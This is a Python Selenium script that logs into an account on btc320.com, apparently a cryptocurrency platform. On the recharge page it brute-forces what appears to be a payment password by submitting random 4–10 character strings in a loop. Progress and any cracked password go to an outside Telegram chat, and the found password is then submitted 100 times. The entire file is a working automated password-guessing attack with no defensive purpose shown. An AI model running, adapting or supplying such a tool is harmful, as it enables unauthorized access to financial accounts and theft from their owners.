import os
import time
import random
import string
import telebot
import chromedriver_autoinstaller
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
USERNAME = os.getenv("USERNAME")
PASSWORD = os.getenv("PASSWORD")

bot = telebot.TeleBot(BOT_TOKEN)

def generate_password(length=6):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def send_log(message):
    try:
        bot.send_message(CHAT_ID, message)
    except Exception as e:
        print("Telegram Error:", e)

def start_driver():
    chromedriver_autoinstaller.install()
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.binary_location = "/opt/google/chrome/google-chrome"
    service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(service=service, options=chrome_options)

def main():
    driver = start_driver()
    try:
        driver.get("https://www.btc320.com/pages/user/other/userLogin")
        time.sleep(5)

        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view[2]/uni-view/uni-input/div/input').send_keys(USERNAME)
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[5]/uni-view[1]/uni-view[2]/uni-view/uni-input/div/input').send_keys(PASSWORD)
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[6]/uni-button').click()
        time.sleep(6)
        send_log("✅ Logged in successfully.")

        driver.get("https://www.btc320.com/pages/user/recharge/userRecharge")
        time.sleep(6)
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("10")

        batch = []
        found_password = None
        attempt = 0

        while True:
            pwd = generate_password(random.randint(4, 10))
            attempt += 1
            try:
                input_box = driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[9]/uni-view/uni-view/uni-input/div/input')
                input_box.clear()
                input_box.send_keys(pwd)
                driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view/uni-button').click()
                time.sleep(5)

                current_url = driver.current_url
                if "rechargePay?sn=" in current_url:
                    send_log(f"✅ Password found: `{pwd}` on attempt {attempt}")
                    found_password = pwd
                    break
                else:
                    batch.append(f"{pwd} ❌")
            except Exception as e:
                batch.append(f"{pwd} ⚠️ Error: {e}")

            if len(batch) == 50:
                send_log("🧪 Tried 50 passwords:\n" + "\n".join(batch))
                batch.clear()

        for i in range(100):
            try:
                input_box = driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[9]/uni-view/uni-view/uni-input/div/input')
                input_box.clear()
                input_box.send_keys(found_password)
                driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view/uni-button').click()
                time.sleep(2)
            except:
                pass

        send_log(f"✅ Confirmed password `{found_password}` 100x\n⛔ Bot stopped.")

    except Exception as e:
        send_log(f"🔥 Bot crashed: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    send_log("🚀 Bot started.")
    main()
